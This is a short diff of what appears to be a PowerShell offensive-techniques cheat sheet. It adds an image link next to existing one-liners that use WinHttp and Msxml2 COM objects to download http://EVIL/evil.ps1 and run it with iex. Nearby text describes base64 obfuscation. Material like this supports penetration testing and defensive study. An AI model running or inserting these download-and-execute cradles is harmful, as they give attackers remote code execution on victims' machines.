@@ -908,6 +908,8 @@ The above string can be obfuscated using **powershell special characters:** **`*
       $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
       $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
 
+![powershell Additional Methods for Remote Download](http://i.cubeupload.com/tMG9I8.jpg)
+
 ---
 
       Using base64 stings decoded at runtime are a Useful obfuscation trick, because
